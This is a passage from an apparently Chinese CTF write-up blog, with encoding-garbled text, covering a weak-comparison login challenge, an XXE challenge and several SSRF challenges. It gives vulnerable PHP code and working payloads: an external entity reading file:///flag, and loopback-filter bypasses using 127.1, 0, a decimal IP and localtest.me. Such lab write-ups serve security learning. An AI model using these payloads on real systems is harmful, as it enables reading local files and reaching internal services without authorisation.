class="hljs-string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span><br>                        &#125;<br>                        self<span class="hljs-selector-class">.send_response</span>(<span class="hljs-number">200</span>)<br>                        self<span class="hljs-selector-class">.end_headers</span>()<br>                        self<span class="hljs-selector-class">.wfile</span><span class="hljs-selector-class">.write</span>(json<span class="hljs-selector-class">.dumps</span>(data)<span class="hljs-selector-class">.encode</span>())<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br>                        return<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users<span class="hljs-selector-class">.items</span>()<br><br>hashed_users = <span class="hljs-built_in">dict</span>((k,<span class="hljs-built_in">gethash</span>(k,v)) <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> users<span class="hljs-selector-class">.items</span>())<br><br>assert <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> users<br>assert users<span class="hljs-selector-attr">[<span class="hljs-string">&quot;admin&quot;</span>]</span> == <span class="hljs-string">&quot;admin&quot;</span><br></code></pre></td></tr></table></figure><p>hashed_users&#x3D;{â€˜adminâ€™,0},kä¸ºadminï¼Œvä¸º0<br>if hashed &#x3D;&#x3D; v:  hashedå¯¹æˆ‘ä»¬ä¼ å…¥çš„usernameå’Œpasswordè¿›è¡Œå¼‚æˆ–(^),ä¸¤è€…ç›¸åŒä¸º0<br>æ‰€ä»¥æˆ‘ä»¬çš„usernameå’Œpasswordè¦ç›¸ç­‰ï¼Œä½†ä»£ç æœ‰è¯´æ˜username!&#x3D;passwordï¼Œå¥½åœ¨æ˜¯å¼±æ¯”è¾ƒï¼Œæˆ‘ä»¬å¯ä»¥æ•°å­—å’Œæ•°å­—å­—ç¬¦æ¯”è¾ƒ</p><p><img src="/images/GCGH3S1RWUG78DVN.png"></p><p><img src="/images/USTULSP1TF6QD9N6L.png"></p><p>flag</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;C0nGUrAti0ns!_y0U_hAve_sUCCessFUlly_siGnin!_iYlJf!M3rux9G9Vf!Jox&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>xxe</title>
    <link href="/2023/10/06/xxe/"/>
    <url>/2023/10/06/xxe/</url>
    
    <content type="html"><![CDATA[<h1 id="XXEæ¼æ´ä»‹ç»"><a href="#XXEæ¼æ´ä»‹ç»" class="headerlink" title="XXEæ¼æ´ä»‹ç»"></a>XXEæ¼æ´ä»‹ç»</h1><p><a href="https://xz.aliyun.com/t/3357">XXEæ¼æ´è¯¦è§£</a></p><h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-comment">// åŠ è½½xmlå®ä½“ï¼Œå‚æ•°ä¸ºæ›¿ä»£å®ä½“ã€åŠ è½½å¤–éƒ¨å­é›†</span><br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-comment">// æŠŠ DOM èŠ‚ç‚¹è½¬æ¢ä¸º SimpleXMLElement å¯¹è±¡</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-comment">// èŠ‚ç‚¹åµŒå¥—</span><br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br></code></pre></td></tr></table></figure><p><code>libxml_disable_entity_loader(false);</code><br>ç¦æ­¢åŠ è½½å¤–éƒ¨å®ä½“ã€‚ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆï¼šä¸€ä¸ªå’Œå·(&amp;),ä¸€ä¸ªå®ä½“åç§°ï¼Œä»¥åŠä¸€ä¸ªåˆ†å·(;)<br>flagçš„è·¯å¾„æ˜¯&#x2F;flag</p><p>åœ¨burpsuiteä¸­post</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">XXE</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">cmd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">yasuo</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;cmd;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">yasuo</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/DUBZ2H8DZH1GVXQ7GNM5.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/2023/09/26/ssrf/"/>
    <url>/2023/09/26/ssrf/</url>
    
    <content type="html"><![CDATA[<h1 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h1><p><strong>SSRFæ”»å‡»ç‚¹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li>curl_init(): åˆå§‹curlä¼šè¯</li><li>curl_setopt(): ä¼šè¯è®¾ç½®</li><li>curl_exec(): æ‰§è¡Œcurlä¼šè¯ï¼Œè·å–å†…å®¹</li><li>curl_close(): ä¼šè¯å…³é—­</li></ul><p><strong>gopheråè®®</strong><br>é€šè¿‡gopheråè®®ï¼Œå°†è¯·æ±‚ä½“ç”¨urlç¼–ç ååŠ ä¸Šä»»æ„å­—ç¬¦ï¼Œä¸€èˆ¬æ˜¯ä¸‹åˆ’çº¿ï¼Œæ¥ä¸Šgopherçš„urlå³å¯æ‰§è¡ŒGETã€POSTè¯·æ±‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gopher:<span class="hljs-regexp">//i</span>p:port/_[stream]<br></code></pre></td></tr></table></figure><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>å…ˆè¿›å…¥flag.phpçœ‹çœ‹<br><img src="/images/RQX4YD2YL8KI0N1X.png"><br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä»£ç ä¸­æœ‰ä¸ªæ­£åˆ™åŒ¹é…ï¼Œä½†å®ƒå¹¶æ²¡æœ‰å‚æ•°<br><a href="https://www.php.net/manual/zh/function.parse-url.php">parse_url()</a>å‡½æ•°è§£æ URL å¹¶è¿”å›å…³è”æ•°ç»„ï¼ŒåŒ…å«åœ¨ URL ä¸­å‡ºç°çš„å„ç§ç»„æˆéƒ¨åˆ†ã€‚æ•°ç»„çš„å…ƒç´ å€¼ä¸ä¼š URL è§£ç ã€‚<br><strong>ç¤ºä¾‹</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;?php<br>$url = &#x27;http:<span class="hljs-comment">//username:password@hostname:9090/path?arg=value#anchor&#x27;;</span><br><br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_SCHEME)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_USER)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_PASS)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_HOST)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_PORT)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_PATH)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_QUERY)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_FRAGMENT)</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šç¤ºä¾‹ä¼šè¾“å‡º</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span></span> &#123;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;scheme&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;host&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;hostname&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;port&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">int</span>(<span class="hljs-number">9090</span>)<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;user&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;username&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;pass&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;password&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;path&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;/path&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;query&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;arg=value&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;fragment&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;anchor&quot;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span> <span class="hljs-string">&quot;http&quot;</span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span></span> <span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span></span> <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span></span> <span class="hljs-string">&quot;hostname&quot;</span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">9090</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span> <span class="hljs-string">&quot;/path&quot;</span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">9</span>)</span></span> <span class="hljs-string">&quot;arg=value&quot;</span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">6</span>)</span></span> <span class="hljs-string">&quot;anchor&quot;</span><br></code></pre></td></tr></table></figure><p>æœ€ä¸Šé¢ä¸¤ä¸ªifæ„Ÿè§‰åœ¨æœ¬é¢˜éƒ½æ²¡ä»€ä¹ˆä½œç”¨<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br></code></pre></td></tr></table></figure><p>æ ¹æ®parse_url()å‡½æ•°çš„è§£æï¼Œè¿™é¢˜è¿˜æœ‰å„ç§å§¿åŠ¿è·å¾—flag</p><ul><li>127.1ä¼šè¢«è§£ææˆ127.0.0.1ï¼Œä¹Ÿå°±æ„å‘³ç€ä¸ºé›¶å¯ç¼ºçœ</li><li>åœ¨Linuxä¸­ï¼Œ0ä¹Ÿä¼šè¢«è§£ææˆ127.0.0.1</li><li>127.0.0.0&#x2F;8æ˜¯ä¸€ä¸ªç¯å›åœ°å€ç½‘æ®µï¼Œä»127.0.0.1 ~ 127.255.255.254éƒ½è¡¨ç¤ºlocalhost</li><li>ipåœ°å€è¿˜å¯ä»¥é€šè¿‡è¡¨ç¤ºæˆå…¶ä»–è¿›åˆ¶çš„å½¢å¼è®¿é—®ï¼Œ<a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">IPåœ°å€äºŒè¿›åˆ¶ã€åè¿›åˆ¶ã€åå…­è¿›åˆ¶äº’æ¢</a></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.1</span>/flag.php<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/flag.php<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.255</span>.<span class="hljs-number">255.254</span>/flag.php<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127\.0\.|\ã€‚/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é¢˜æ­£åˆ™åŠ äº†urlå‚æ•°<br>ä»£è¡¨è¿™æˆ‘ä»¬ä¸èƒ½ç›´æ¥127.0.0.1&#x2F;flag.phpè¾“å…¥äº†<br>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å’Œä¸Šé¢˜ä¸€æ ·æŠŠ127.0.0.1è½¬æ¢ä¸ºåè¿›åˆ¶<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|1|0|ã€‚/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>å¯æ¶å•ŠğŸ˜¡ï¼Œç«Ÿç„¶è¿‡æ»¤äº†0å’Œ1ï¼Œè¿™ä»£è¡¨ç€ä¸Šé¢çš„æ–¹æ³•éƒ½ä¸èƒ½ç”¨äº†<br>ç›´æ¥æœç´¢æŒ‡å‘127.0.0.1çš„åŸŸå,ç›´æ¥æ‹¿æ¥å¥—ç€ç”¨<br><a href="https://www.maoyingdong.com/domain_to_localhost/">ä¼ é€é—¨</a></p><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span>localtest.me/flag.php<br></code></pre></td></tr></table></figure><h2 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 